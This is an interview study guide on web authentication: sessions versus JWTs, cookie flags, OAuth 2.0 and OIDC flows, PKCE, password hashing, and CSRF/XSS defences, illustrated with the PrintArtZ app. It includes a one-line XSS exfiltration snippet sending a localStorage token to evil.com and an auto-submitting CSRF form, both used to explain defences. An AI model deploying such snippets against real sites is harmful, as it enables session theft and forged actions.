Auth & OAuth — interview study guide

Authentication and authorization are the backbone of any app that has users — PrintArtZ signs people in with Auth.js (NextAuth) using Google OAuth and keeps them logged in with database-backed sessions via a Prisma adapter. This guide goes from absolute basics to advanced, in interview Q&A form with real snippets and the kind of full, spoken-aloud answer an interviewer expects. Click any question to expand.

Authentication (AuthN) answers “who are you?” — it verifies identity, for example by checking a password or confirming a Google login. Authorization (AuthZ) answers “what are you allowed to do?” — it decides whether that now-known identity may perform an action, like editing a design or accessing an admin page.

The order matters: you authenticate first, then authorize. A common way to remember it: authentication is showing your passport at the border; authorization is the visa that says which areas you can enter. They are often conflated because both are “auth,” but they answer different questions and are usually implemented in different layers — identity providers handle AuthN, while your own app logic (role checks, ownership checks) handles AuthZ.

In PrintArtZ, Auth.js + Google handles authentication (proving you are a specific Google account), while the app's own code handles authorization — e.g. checking that the logged-in user actually owns a design before letting them delete it, or that they still have print quota remaining.

HTTP is stateless — each request arrives with no memory of the ones before it. A session is the mechanism that lets the server recognize a series of requests as coming from the same logged-in user, so you don't have to re-enter your password on every click.

Conceptually, when you log in the server establishes a session (a record that “this identifier belongs to user Amit”) and hands the browser a token or id — almost always in a cookie. The browser then sends that identifier back on every subsequent request, and the server uses it to look up who you are. The session is the bridge that turns a stateless protocol into a continuous, personalized experience.

In PrintArtZ, after Google sign-in, Auth.js creates a session row in the database (through the Prisma adapter) and sets a session cookie in the browser. Every later request carries that cookie, and Auth.js resolves it back to the user record.

Persistence comes down to the browser automatically resending a credential on every request. After a successful login the server responds with a Set-Cookie header; the browser stores that cookie and, per the same-origin cookie rules, attaches it to all future requests to that site. The server reads it and re-establishes “who you are” each time.

HTTP/1.1 200 OK
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax; Path=/

// every later request the browser sends:
Cookie: session=abc123

The value in the cookie is either an opaque session id that the server looks up in a store (stateful), or a self-contained signed token like a JWT the server can verify without a lookup (stateless). PrintArtZ uses the first model: the cookie holds a session token that maps to a row in the database.

The main families are: something you know (a password or PIN), something you have (a phone receiving an OTP, a hardware key, an authenticator app), and something you are (biometrics like a fingerprint or face). Combining two of these is multi-factor authentication (MFA), which dramatically reduces account takeover because stealing a password alone is no longer enough.

At the application level these show up as: local username/password, federated / social login (“Sign in with Google/GitHub” via OAuth/OIDC), magic links (a one-time login URL emailed to you), and increasingly passkeys (WebAuthn public-key credentials that replace passwords entirely). PrintArtZ uses federated login with Google, which offloads password handling and MFA to Google.

Auth.js (the framework-agnostic evolution of NextAuth) is an authentication library that handles the tedious, security-sensitive plumbing so you don't hand-roll it. It provides ready-made providers (Google, GitHub, email, credentials), runs the OAuth flow, manages the session (cookie creation, CSRF protection, sign-in/sign-out endpoints), and integrates with a database through an adapter.

Concretely it mounts a set of routes under /api/auth/* — for example /api/auth/signin, /api/auth/callback/google, /api/auth/session, and /api/auth/signout. You configure which providers to use and how sessions are stored, and it does the redirects, token exchange, and cookie management.

In PrintArtZ it's wired with the Google provider and the Prisma adapter, so signing in creates/looks up User, Account, and Session rows automatically. The choice of the Prisma adapter is what makes PrintArtZ use database sessions rather than JWT sessions.

An identity is the set of attributes that describe a user (an id, email, name). Authentication is the act of proving a request belongs to a given identity. Identity federation is delegating that proof to a trusted third party — an Identity Provider (IdP) like Google — so your app (the “relying party”) never handles the credential itself.

Federation is why “Sign in with Google” exists: the user proves themselves to Google, Google vouches for them to PrintArtZ, and PrintArtZ trusts that assertion. The benefits are large — no password storage, Google's MFA and anomaly detection come for free, and users skip yet another account. The trade-off is a dependency on the provider and the need to trust and correctly verify its assertions (the ID token).

A server-side session is stateful: the actual session data lives on the server (in a database, Redis, or memory), and the browser only holds an opaque session id in a cookie. On each request the server takes that id, looks up the corresponding record, and learns who the user is and what's in their session.

Cookie:  session=9f2c1a...    // meaningless on its own
DB row:  { id: "9f2c1a...", userId: 42, expires: 2026-10-01 }

The key property is that the cookie contains no user information — it's just a pointer. The server is the source of truth, which means you can revoke a session instantly by deleting its row, and you can store as much as you like server-side without bloating the cookie.

PrintArtZ uses exactly this model: the Prisma adapter writes a Session row keyed by the session token in the cookie, and Auth.js reads that row to resolve the current user on each request.

A JWT (JSON Web Token) is a self-contained, signed token that carries the user's data inside it. It's stateless: the server can verify and trust it using a secret/key without any database lookup, because the signature guarantees the contents weren't tampered with.

It has three Base64URL-encoded parts joined by dots — header.payload.signature:

// header  — algorithm & type
{ "alg": "HS256", "typ": "JWT" }
// payload — the "claims" (data)
{ "sub": "42", "name": "Amit", "role": "user", "exp": 1735689600 }
// signature — HMAC/RSA over header+payload using a secret

eyJhbGci...  .  eyJzdWIiOiI0Mi...  .  SflKxwRJSMeKKF2QT4f...

Crucially, the payload is encoded, not encrypted — anyone can decode and read it, so never put secrets in a JWT. The signature only proves integrity and authenticity (it wasn't altered and it came from someone with the key), not confidentiality.

Server-side sessions

Cookie holds an opaque id; data lives on the server. Instantly revocable, easy to change permissions on the fly, tiny cookie. Costs a lookup per request and a shared store across servers.

JWTs

Token carries the data and is verified by signature — no lookup, scales horizontally with no shared store. But hard to revoke before expiry, and stale until the token is reissued.

The honest one-line summary interviewers want: sessions trade a lookup for easy revocation and control; JWTs trade revocation for statelessness and scale. JWTs shine for short-lived access tokens between services or APIs. For a normal web app where you want to be able to log someone out immediately and change their access, database sessions are often the safer default — which is why PrintArtZ uses them.

For server-side sessions: the client stores only the opaque session id, ideally in an HttpOnly cookie; the server stores the full session record in its store (DB/Redis). Two places, but the sensitive data never leaves the server.

For JWT sessions: the server stores nothing (it just holds the signing key); the entire session lives on the client. That client-side token should still be kept in an HttpOnly cookie rather than localStorage to keep it away from JavaScript and XSS.

A useful nuance: Auth.js supports both strategies. With no database adapter it defaults to an encrypted JWT in a cookie; with the Prisma adapter (PrintArtZ's setup) it switches to database sessions where the cookie is just a token pointing at a Session row.

With server-side sessions logout is clean and immediate: delete (or mark expired) the session row and clear the cookie. Because the server checks the store on every request, the next request from that browser instantly fails — you can even remotely kill sessions on other devices.

With stateless JWTs there's a fundamental problem: a signed token is valid until it expires, and the server isn't consulting a store, so you can't simply “delete” it. Real logout requires extra machinery — keep access tokens short-lived (minutes) and use refresh tokens, and/or maintain a server-side denylist/blocklist of revoked token ids, which ironically reintroduces the state JWTs were meant to avoid.

This revocation gap is a top reason PrintArtZ uses database sessions: clicking sign-out deletes the Session row and the user is truly logged out that instant.

An access token is a short-lived credential (often a JWT, valid for minutes) that a client presents to access protected resources/APIs. A refresh token is a long-lived credential used only to obtain new access tokens when the old one expires — it's never sent to resource APIs.

The split exists to balance security and usability. Because access tokens can't be easily revoked, you make them expire quickly to limit the damage window if one leaks. But forcing the user to log in every few minutes is terrible UX — so the refresh token silently mints fresh access tokens in the background. The refresh token is higher value, so it's stored more carefully (HttpOnly cookie), can be revoked server-side, and is often rotated (a new one issued on each use, with reuse detection to catch theft).

POST /oauth/token
grant_type=refresh_token&refresh_token=rt_9f...
-> { access_token: "eyJ...", expires_in: 900, refresh_token: "rt_ab..." }

In an OAuth setup, the provider (Google) issues these; Auth.js can persist the refresh token in the Account row so PrintArtZ could call Google APIs on the user's behalf later without re-prompting.

The problem with naive in-memory sessions is that they live on one server — if a load balancer routes the user's next request to a different instance, that server has no idea who they are. There are three standard fixes.

  • Shared session store: put sessions in a central store (Redis, or a database like PrintArtZ's) that every instance can read. Simple and revocable; adds a network hop per request.
  • Sticky sessions: configure the load balancer to always send a user to the same instance. Easy, but breaks on deploys/scaling and unbalances load.
  • Stateless JWTs: no shared store needed — any instance verifies the token by signature. Scales beautifully but loses easy revocation.

PrintArtZ takes the shared-store route implicitly: sessions are database rows, so any serverless function or instance handling a request resolves the same session from the same database.

A cookie is a small piece of data the server sends via a Set-Cookie response header; the browser stores it and automatically attaches it to every subsequent request to the matching domain/path in a Cookie header. That automatic resend is precisely what makes cookies the natural home for a session identifier.

Set-Cookie: session=abc123; Domain=printartz.app; Path=/;
            Max-Age=2592000; HttpOnly; Secure; SameSite=Lax

Key attributes control scope and lifetime: Domain/Path decide where it's sent, Expires/Max-Age decide how long it lives (a cookie with neither is a “session cookie” that dies when the browser closes), and the security flags below control who can read it and when it's sent.

These three flags are the core defenses for a session cookie, and interviewers love to hear all three explained precisely:

  • HttpOnly: the cookie is invisible to JavaScript (document.cookie can't read it). This is the primary defense that stops an XSS attack from stealing the session token.
  • Secure: the cookie is only sent over HTTPS, so it can't be sniffed over plaintext HTTP on a hostile network.
  • SameSite: controls whether the cookie is sent on cross-site requests. Strict never sends it cross-site, Lax (a sensible default) sends it on top-level navigations but not on embedded/background cross-site requests, and None always sends it but then requires Secure. This is a key CSRF mitigation.

Auth.js sets its session cookie HttpOnly, Secure (in production), and SameSite=Lax by default — exactly the recommended combination for PrintArtZ.

Cookies

Sent automatically to the server on every request; can be HttpOnly (hidden from JS); ~4KB; support expiry and the security flags. Ideal for auth tokens.

localStorage / sessionStorage

Client-only, never auto-sent to the server; always readable by JavaScript; ~5MB. sessionStorage clears on tab close, localStorage persists. Good for non-sensitive UI state.

The decisive difference for auth is who can read it and whether it's sent automatically. Because Web Storage is always JavaScript-accessible, it can never be protected from XSS the way an HttpOnly cookie can. Use cookies for the session credential; reserve localStorage for things like theme or draft form state.

Because localStorage is fully readable by any JavaScript running on the page, a single XSS vulnerability — a malicious script injected via a comment, a compromised third-party dependency, an ad — can execute localStorage.getItem('token') and exfiltrate the token to an attacker's server. The attacker then has a valid credential and can impersonate the user from anywhere.

// what an injected script can trivially do:
fetch("https://evil.com/steal?t=" + localStorage.getItem("token"));

An HttpOnly cookie is immune to this specific theft because JavaScript literally cannot read it. The common counter-argument is “but cookies are vulnerable to CSRF” — true, yet CSRF has robust, well-understood defenses (SameSite, CSRF tokens), whereas there is no comparable in-page defense once XSS can read your storage. The consensus best practice, and PrintArtZ's approach, is the HttpOnly cookie.

These are special name prefixes browsers enforce to harden cookies against tampering by weaker sibling contexts. A cookie named with __Secure- must be set with the Secure flag over HTTPS. A cookie named with __Host- must additionally have no Domain attribute and a Path=/, which locks it to the exact host and prevents a subdomain from overwriting it.

Set-Cookie: __Host-session=abc123; Secure; Path=/; HttpOnly; SameSite=Lax

The benefit is defense against cookie fixation/injection from a compromised or malicious subdomain. Auth.js automatically uses these prefixes for its cookies in production (e.g. __Secure-next-auth.session-token), so PrintArtZ gets this hardening for free.

Tracing the cookie lifecycle end-to-end is a great way to show you understand the whole picture:

  1. User clicks “Sign in with Google.” Auth.js first sets a short-lived CSRF token and a state cookie, then redirects to Google.
  2. Google authenticates the user and redirects back to /api/auth/callback/google with an authorization code.
  3. Auth.js verifies the returned state against the cookie (CSRF protection), exchanges the code for tokens server-side, and reads the user's profile from the ID token.
  4. The Prisma adapter upserts the User/Account and creates a Session row, then Auth.js sends Set-Cookie with the session token (HttpOnly; Secure; SameSite=Lax).
  5. On every later request the browser auto-sends that cookie; Auth.js looks up the Session row to identify the user. On sign-out it deletes the row and clears the cookie.

Notice the browser stores only the opaque token — all the sensitive identity data stays in PrintArtZ's database.

OAuth 2.0 is an authorization framework that lets a user grant one application limited access to their data on another service without sharing their password. The classic example is letting a photo-printing app read your Google Photos: you approve it, and the app gets a scoped access token — never your Google credentials.

The most important interview nuance: OAuth is about authorization (delegated access), not authentication. It was designed to answer “can this app access that resource on my behalf?” People bolted login onto it — which is exactly why OpenID Connect was later added on top to do authentication properly. Confusing the two is one of the most common mistakes candidates make.

OAuth defines four parties, and naming them cleanly makes the whole flow click:

  • Resource Owner: the user who owns the data and grants access (you).
  • Client: the application requesting access (PrintArtZ).
  • Authorization Server: the service that authenticates the user and issues tokens (Google's OAuth server).
  • Resource Server: the API holding the protected data that accepts the access token (a Google API).

In PrintArtZ, you are the resource owner, PrintArtZ is the client, and Google plays both the authorization server (during sign-in) and, if PrintArtZ ever calls Google APIs, the resource server.

The Authorization Code flow is the standard, most secure flow for web apps, and PrintArtZ uses it via Auth.js. The core idea is a two-step handoff: the browser only ever carries a temporary code, and the actual token exchange happens server-to-server.

  1. Redirect to authorize: PrintArtZ redirects the browser to Google's authorize endpoint with its client_id, redirect_uri, requested scope, and a random state value.
  2. User consents: Google authenticates the user (and shows the consent screen if needed).
  3. Code returned: Google redirects back to /api/auth/callback/google?code=...&state=.... The code is short-lived and single-use.
  4. Token exchange (back channel): PrintArtZ's server POSTs the code plus its client secret directly to Google's token endpoint and receives an ID token and access token — this never touches the browser.
  5. Session created: PrintArtZ verifies the tokens, creates the session, and sets the cookie.
// 1) browser -> Google
GET https://accounts.google.com/o/oauth2/v2/auth
  ?client_id=...&redirect_uri=.../api/auth/callback/google
  &response_type=code&scope=openid%20email%20profile&state=xyz

// 4) server -> Google (back channel, includes client_secret)
POST https://oauth2.googleapis.com/token
  code=...&client_id=...&client_secret=...&grant_type=authorization_code

Why not just return the token to the browser directly? Because the browser/redirect URL is exposed (history, logs, referrer); shipping only a one-time code and doing the secret-bearing exchange server-side keeps the actual token out of that exposed channel.

The state parameter is a random, unguessable value the client generates before redirecting to the authorization server, stashes (in a cookie or session), and then checks matches when the callback returns. Its job is CSRF protection for the OAuth flow — it ensures the callback that arrives is the response to a request this user actually initiated, not one an attacker stitched together.

Without state, an attacker could trick a victim into completing a login that links the victim's session to the attacker's account (a “login CSRF” / authorization-code-injection attack). Auth.js generates and verifies state automatically, so PrintArtZ is protected without extra work.

Scopes are strings that declare exactly what access the client is asking for — e.g. openid, email, profile, or something granular like https://www.googleapis.com/auth/drive.readonly. They implement the principle of least privilege: the app requests only what it needs, and the user sees those specific permissions on the consent screen before approving.

The access token that comes back is limited to the granted scopes, so even if it leaks, the blast radius is bounded to what was consented. For login, PrintArtZ only needs openid email profile — enough to identify the user and populate their name/email — and nothing more invasive, which keeps the consent screen minimal and trustworthy.

OpenID Connect is a thin authentication layer built on top of OAuth 2.0. OAuth alone gives you an access token to reach APIs but says nothing standard about who the user is; OIDC fixes that by adding an ID token — a JWT with verified identity claims — plus a standardized /userinfo endpoint and the special openid scope.

The mental model: OAuth = authorization (access to resources); OIDC = authentication (proof of identity) done the right way on the same rails. Because “Sign in with Google” is really a login, it uses OIDC — the presence of the openid scope and the ID token is what turns an OAuth flow into a proper authentication flow.

// ID token payload (identity claims) returned by OIDC
{ "iss": "https://accounts.google.com", "aud": "<client_id>",
  "sub": "10769150350006150...", "email": "amit@example.com",
  "email_verified": true, "name": "Amit", "exp": 1735689600 }

Auth.js reads and verifies this ID token during the Google callback and uses its claims to create the PrintArtZ user record.

ID token (OIDC)

Proves who the user is. A JWT for the client to read; contains identity claims (sub, email, name). You verify it (issuer, audience, signature, expiry) but never send it to an API.

Access token (OAuth)

Grants access to resources. Meant for the resource server / API, not for the client to inspect; often opaque. You attach it to API calls as Authorization: Bearer ....

Rule of thumb: the ID token is about the user, for you; the access token is for the API, use it don't read it. A classic bug is treating an access token as proof of identity, or sending an ID token to an API — mixing up their audiences.

PKCE (Proof Key for Code Exchange, pronounced “pixy”) hardens the authorization code flow against code interception. The client generates a random secret called the code_verifier, sends its hash (code_challenge) on the initial authorize request, and then must present the original code_verifier when exchanging the code for tokens. The authorization server checks the verifier hashes to the challenge it saw.

// 1) authorize request carries the hashed challenge
code_challenge=BASE64URL(SHA256(verifier))&code_challenge_method=S256
// 2) token exchange must prove knowledge of the original
POST /token  code=...&code_verifier=<original random string>

The payoff: even if an attacker steals the authorization code (say from a redirect on a mobile device or a shared machine), they can't redeem it without the verifier, which never left the legitimate client. PKCE originated to protect public clients (mobile/SPA that can't hold a secret) but is now recommended for all clients, and Auth.js applies it to PrintArtZ's Google flow by default.

Delegating authentication to Google removes an entire category of risk and work. You never store passwords, so there's no password database to breach, no hashing/reset/lockout logic to get right, and no liability for credential leaks. You inherit Google's MFA, bot defenses, and anomaly detection for free, and Google gives you a pre-verified email, which sidesteps your own email-verification flow.

The UX win is real too: users skip creating yet another account and password, which improves conversion. The trade-offs to acknowledge in an interview are the dependency on Google (availability, account lock-outs), tying users to that provider unless you also offer alternatives, and privacy considerations around the third party. For a project like PrintArtZ, offloading auth to Google is a pragmatic, secure default.

The Implicit flow was an older OAuth variant where the authorization server returned the access token directly in the browser redirect (in the URL fragment), skipping the code-exchange step. It existed because early SPAs couldn't do a back-channel exchange and couldn't keep a client secret.

It's now discouraged (the OAuth 2.1 direction drops it) because putting the token in the URL exposes it to browser history, referrer headers, and any script on the page, and it can't use a client secret or reliable rotation. The modern recommendation is the Authorization Code flow with PKCE for everyone, including SPAs — you get the security of the code exchange without needing a stored secret. PrintArtZ, being a server-rendered Next.js app, uses the code flow with a real client secret plus PKCE.

Storing passwords in plaintext means a single database breach hands the attacker every user's actual password — which they'll reuse on the victims' other accounts. Even encryption is wrong for passwords because it's reversible: whoever holds the key (and an attacker who breaches your server often does) can decrypt them all.

Hashing is the right tool because it's a one-way function — you store hash(password), and at login you hash the submitted password and compare. You never need to recover the original, so there's nothing reversible to steal. Critically, you must use a slow, password-specific hash (bcrypt, scrypt, Argon2), not a fast general hash like SHA-256, which attackers can brute-force billions of times per second.

PrintArtZ sidesteps this entirely by using Google OAuth — it stores no passwords at all, which is the most secure password strategy of all: don't have any.

A salt is a unique random value generated per password and stored alongside the hash; it's mixed into the input before hashing. Its job is to defeat precomputation attacks — specifically rainbow tables, which are giant lookup tables mapping common passwords to their hashes.

Because every user gets a different salt, two people with the same password get completely different hashes, so an attacker can't reuse one cracked result or a prebuilt table — they'd have to brute-force each account separately. Salts don't need to be secret, just unique. Modern password hashes like bcrypt and Argon2 generate and embed the salt automatically inside the output string, so you store one value and get salting for free.

// bcrypt output embeds algorithm, cost, salt, and hash:
$2b$12$eImiTXuWVxfM37uY4JANjQ.  someHashBytesHere...
//  |   |   \___ 22-char salt _/ \____ hash ____/
// alg cost

Both are deliberately slow, adaptive password hashes. The work factor (bcrypt's “cost”, Argon2's time/memory/parallelism parameters) is a tunable knob that makes hashing take a set amount of effort — you dial it up as hardware gets faster so a single guess stays expensive for attackers while remaining acceptable (tens of ms) for a real login.

bcrypt

Battle-tested since 1999, simple, widely available. CPU-hard via its cost factor. Limitation: caps input around 72 bytes and isn't memory-hard, so it's more vulnerable to GPU/ASIC cracking.

Argon2

Winner of the 2015 Password Hashing Competition; memory-hard (tunable RAM usage), which blunts GPU/ASIC attacks. Argon2id is the recommended variant. The current best-practice default for new systems.

Practical guidance: choose Argon2id for new projects; bcrypt remains perfectly acceptable and is a fine, well-supported choice. Either way, never use fast hashes (MD5/SHA) for passwords.

Cross-Site Request Forgery tricks a logged-in user's browser into making an unwanted state-changing request to a site where they're authenticated. Because the browser automatically attaches the session cookie, a hidden form or image on a malicious page can fire a request (say “transfer money” or “delete my design”) that the server can't distinguish from a legitimate one.

<!-- on evil.com: auto-submits using the victim's cookie -->
<form action="https://printartz.app/api/delete" method="POST">
  <input type="hidden" name="id" value="42">
</form><script>document.forms[0].submit()</script>

The main defenses: SameSite cookies (Lax/Strict stop the cookie from being sent on cross-site POSTs), anti-CSRF tokens (an unguessable token the server issues and requires echoed back, which the attacker's page can't read due to same-origin policy), and checking the Origin/Referer header. Auth.js ships CSRF token protection for its sign-in/out endpoints and uses SameSite=Lax cookies, so PrintArtZ is covered on both fronts.

Cross-Site Scripting is when an attacker gets their JavaScript to run in the context of your page — for example by injecting a script through an unsanitized comment or profile field that other users then load. Once attacker code runs on your origin, it can do anything the user can: read the DOM, make authenticated requests, and read any JS-accessible storage.

Its link to sessions is direct: if the session token lives somewhere JavaScript can reach (like localStorage, or a non-HttpOnly cookie), XSS steals it instantly. Defenses are layered: output encoding / auto-escaping (React does this by default, which is why you avoid dangerouslySetInnerHTML), a strict Content-Security-Policy to limit what scripts can run, input validation, and putting the session in an HttpOnly cookie so even a successful XSS can't read the token. PrintArtZ benefits from React's escaping and Auth.js's HttpOnly cookie.

CSRF

Abuses the trust a site has in the user's browser — it makes the victim's browser send a forged authenticated request. The attacker never sees the response or steals data; they just trigger an action. Fixed with SameSite + CSRF tokens.

XSS

Abuses the trust a user has in a site — it runs attacker JavaScript on your page, which can read data, tokens, and impersonate the user fully. Fixed with output encoding, CSP, and HttpOnly cookies.

One line that lands in interviews: CSRF makes the browser do something; XSS makes the browser run something. XSS is generally the more severe because arbitrary script execution can even bypass CSRF tokens by reading them.

HTTPS (TLS) encrypts traffic between the browser and server, which is non-negotiable for auth because otherwise credentials, session cookies, and tokens travel in plaintext that anyone on the network path — a rogue Wi-Fi hotspot, a compromised router — can read or modify. A sniffed session cookie is a complete account takeover.

Beyond confidentiality, TLS provides integrity (traffic can't be silently tampered with) and server authentication (the certificate proves you're really talking to printartz.app, thwarting man-in-the-middle attacks). It's also what makes the Secure cookie flag meaningful. In practice you enforce it everywhere: HTTPS-only, redirect HTTP to HTTPS, and add HSTS so browsers refuse to connect over plain HTTP at all.

  • Storing passwords poorly: plaintext, encryption, or fast hashes (MD5/SHA) instead of salted bcrypt/Argon2.
  • Tokens in localStorage: exposing session credentials to XSS instead of using HttpOnly cookies.
  • No revocation path: long-lived JWTs that can't be logged out or killed after compromise.
  • Weak session hygiene: not rotating the session id after login (session fixation), no idle/absolute timeout, predictable ids.
  • Missing CSRF protection on state-changing cookie-authenticated endpoints.
  • Leaking info in errors: “user not found” vs “wrong password” lets attackers enumerate accounts — return a generic message.
  • No rate limiting / lockout: allowing unlimited login and OTP attempts (brute force, credential stuffing).
  • Trusting tokens without verifying: not checking a JWT's signature, exp, issuer, and audience.

The meta-lesson: prefer a vetted library (like Auth.js) over hand-rolling, because it gets these details right by default.

Verifying a JWT is more than decoding it — you must cryptographically and semantically check it, or you're trusting attacker-supplied data. The essential steps:

  • Signature: verify it with the expected key and reject tokens whose alg you didn't expect — the infamous alg: "none" attack and RS256→HS256 confusion come from skipping this. Pin the algorithm.
  • Expiry & timing: check exp (not expired) and nbf/iat (not used too early).
  • Issuer & audience: confirm iss is the provider you trust and aud matches your client — an ID token minted for another app must be rejected.
  • Claims: validate what you rely on (e.g. email_verified: true).

For OIDC providers like Google you fetch their public signing keys from a JWKS endpoint (keyed by the token's kid) so key rotation just works. Auth.js performs all of this when it processes Google's ID token during PrintArtZ's callback.

Server-side session cookie

Opaque id + HttpOnly cookie. Revocable instantly, tiny footprint, no sensitive data in the browser, easy to change permissions. CSRF-relevant (mitigated by SameSite) and needs a session store/lookup.

JWT

Self-contained, no lookup, great for stateless APIs and microservices. But hard to revoke, larger, and dangerous if stored in localStorage or verified sloppily.

The balanced takeaway: for a user-facing web app where you want instant logout, changeable permissions, and minimal client-side exposure, database-backed session cookies are usually the safer choice — which is exactly why PrintArtZ pairs Auth.js with the Prisma adapter. Reach for JWTs when you specifically need stateless, cross-service tokens and can accept managing short lifetimes and revocation yourself.
